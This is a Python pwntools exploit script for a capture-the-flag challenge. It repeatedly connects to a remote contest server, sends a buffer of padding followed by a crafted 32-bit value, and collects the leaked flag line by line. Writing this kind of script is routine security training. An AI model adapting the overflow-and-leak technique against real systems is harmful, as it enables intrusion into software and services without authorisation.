#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x00000000004011fb

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('amt.rs', 31631)
else:
        p = process(exe.path)

# GDB()
flag = ""
for i in range(0x40, 1, -1):
        p = remote('amt.rs', 31631)
        # p = process(exe.path)
        
        payload = b"a" * 28 + p32(0xffffffff-i+1)

        sla(b"hex:", payload)
        p.recvline()
        flag += p.recvline(keepends=False).decode()
        info("flag " + flag)


p.interactive()
